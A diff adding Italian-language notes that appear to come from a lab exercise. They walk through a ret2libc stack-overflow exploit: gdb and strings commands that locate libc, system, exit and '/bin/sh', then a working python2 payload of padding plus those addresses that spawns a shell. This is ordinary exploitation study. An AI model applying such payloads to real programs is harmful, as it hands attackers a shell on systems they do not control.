@@ -1,0 +1,39 @@
+Eseguo con gdb
+
+faccio run senza argomenti in modo da bloccare l'esecuzione
+
+con info proc map vedo dove inizia libc (0xf7c00000)
+
+con strings vedo dove si trova /bin/sh  (è un offset)
+strings -a -t x /usr/lib32/libc.so.6 | grep "/bin/sh"
+
+OFFSET SH = 0x1b5faa
+
+Prova del nove, vado a vedere cosa trovo nell'indirizzo base libc + offset sh (0xF7DB5FAA)
+con x/s 0xF7DB5FAA.
+
+Bingo! c'è bin/sh
+
+^^ questo è ridondante, posso semplicemente fare ' find "/bin/sh" '. Grazie peda!
+
+
+Trovo l'indirizzo di system e exit con p
+
+0xf7c4c7b0 <system>
+
+0xf7c3bc40 <exit>
+
+0xf7db5faa ("/bin/sh")
+
+per modificare EBP:
+r $(python2 -c 'print "\xEE"*16 + "\xEF\xBE\xAD\xDE"')
+
+l'indirizzo di ritorno di foo dovrebbe trovarsi sotto EBP, quindi per modificarlo metto 20 di padding (4 in piu):
+r $(python2 -c 'print "\xEE"*20 + "\xEF\xBE\xAD\xDE"')
+
+Provo. il payload sarà della forma:
+20b padding + system addr + exit addr + binsh:
+r $(python2 -c 'print "\xEE"*20 + "\xb0\xc7\xc4\xf7"+"\x40\xbc\xc3\xf7"+"\xaa\x5f\xdb\xf7"')
+
+
+got em!!!!
